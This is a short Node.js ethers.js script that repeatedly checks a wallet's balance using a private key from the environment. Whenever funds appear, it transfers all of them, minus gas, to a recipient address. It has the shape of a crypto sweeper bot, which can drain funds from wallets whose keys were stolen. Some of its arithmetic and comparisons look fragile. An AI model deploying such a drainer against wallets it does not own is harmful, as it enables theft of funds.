const ethers = require('ethers');
const dotenv = require('dotenv')
dotenv.config()

const privateKey = process.env.PrivateKey;

const provider = new ethers.providers.WebSocketProvider(process.env.Provider);
const wallet = new ethers.Wallet(privateKey);
const signer = wallet.connect(provider);

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))


async function honeypot() {
    const address = await signer.getAddress();
    const balance = await provider.getBalance(address);
    console.log(balance.toString())
    if (balance.toString() > "0") {
        const gasPrice = await provider.getGasPrice();
        const txFee = gasPrice * 84000;
    
        if (balance > txFee) {
            const tx = await signer.sendTransaction({
                to: process.env.Recipient,
                value: BigInt(balance - txFee),
            })
            await delay(15000) 
        }
    }
    await delay(3000) 
    honeypot()
}
honeypot()


